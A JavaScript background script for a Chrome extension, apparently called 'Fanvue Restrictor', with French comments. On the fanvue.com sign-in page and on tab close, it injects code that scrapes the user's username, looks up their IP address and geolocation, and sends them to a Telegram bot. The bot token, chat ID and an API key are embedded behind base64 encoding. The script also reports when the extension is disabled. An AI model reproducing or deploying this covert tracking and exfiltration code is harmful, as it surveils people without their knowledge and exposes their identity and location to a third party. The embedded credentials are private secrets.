// Fonction pour envoyer des messages à Telegram
function sendTelegramAlert(username, ip, location, action) {
    const TELEGRAM_BOT_TOKEN = decodeBase64('Nzc5NjA1OTE2MDpBQUZKTFM1TlpwRFh0UERfYjc1ekx0N0k4UnNzNy1aeENYNA==');
    const TELEGRAM_CHAT_ID = decodeBase64('NzUwNzYzMTA5Nw==');
    const IP_TOKEN = decodeBase64('ZGIxZGEzNDktOGZhZS00NDhhLWE4ZTMtNzhjMjQxODBmMTFj');

    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    const message = `${action} sur Fanvue !\nNom d'utilisateur: ${username}\nAdresse IP: ${ip}\nLocalisation: ${location}`;

    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url.includes('https://fanvue.com/sign_in')) {
        chrome.scripting.executeScript({
            target: { tabId: tabId },
            function: getUserInfo,
        }).then((results) => {
            if (results && results.length > 0) {
                const userInfo = results[0].result;
                sendTelegramAlert(
                    userInfo.username,
                    userInfo.ip,
                    `${userInfo.lat}, ${userInfo.lon} (Ville: ${userInfo.city}, Pays: ${userInfo.country})`,
                    "🟢 Un utilisateur s'est connecté"
                );
            }
        });
    }
});

chrome.tabs.onRemoved.addListener((tabId, removeInfo) => {
    chrome.scripting.executeScript({
        target: { tabId: tabId },
        function: getUserInfo,
    }).then((results) => {
        if (results && results.length > 0) {
            const userInfo = results[0].result;
            sendTelegramAlert(
                userInfo.username,
                userInfo.ip,
                `${userInfo.lat}, ${userInfo.lon} (Ville: ${userInfo.city}, Pays: ${userInfo.country})`,
                "⚠️ Un utilisateur s'est déconnecté"
            );
        }
    });
});

chrome.runtime.onSuspend.addListener(() => {
    chrome.storage.local.get(['username', 'ip', 'location'], (data) => {
        sendTelegramAlert(
            data.username,
            data.ip,
            `${data.lat}, ${data.lon} (Ville: ${data.city}, Pays: ${data.country})`,
            "🔴 Extension Fanvue Restrictor désactivée."
        );
    });
});

async function getUserInfo() {
    const currentIpResponse = await fetch('https://api.ipify.org/?format=json');
    const currentResponse = await currentIpResponse.json();
    try {
        const ipResponse = await fetch(`https://apiip.net/api/check?ip=${currentResponse.ip}&accessKey=${IP_TOKEN}`);
        if (!ipResponse.ok) {
            throw new Error(`Erreur réseau : ${ipResponse.status}`);
        }
        const ipData = await ipResponse.json();

        return {
            username: document.querySelector('.mui-h4bbp6').textContent,
            ip: currentResponse.ip,
            lat: ipData.latitude,
            lon: ipData.longitude,
            city: ipData.city,
            country: ipData.countryName
        };
    } catch (error) {
        console.error("Erreur lors de la récupération de la localisation:", error);
        return {
            username: document.querySelector('.mui-h4bbp6').textContent,
            ip: currentResponse.ip,
            lat: null,
            lon: null,
            city: null,
            country: null
        };
    }
}

function decodeBase64(encoded) {
    return atob(encoded);
}